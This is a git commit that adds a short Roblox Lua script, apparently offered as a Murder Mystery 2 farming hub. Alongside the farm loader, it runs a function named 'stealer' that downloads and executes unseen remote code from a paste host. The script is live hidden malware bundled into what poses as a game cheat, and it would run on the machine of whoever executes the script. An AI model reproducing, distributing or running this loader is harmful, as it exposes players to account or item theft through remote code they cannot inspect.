a609224f241c95ebf512ae87295e4a0a1428c468
Stillonthebus07 <jfloresnflores@gmail.com>
2026-06-26 03:27:45 -0400

    Add files via upload

---
+++ zuriscript.lua
@@ -0,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://cdn.sourceb.in/bins/RD6Aqlwyvk/0'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/ZuriHubV2/ZuriScripts/refs/heads/main/Mm2Hub'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
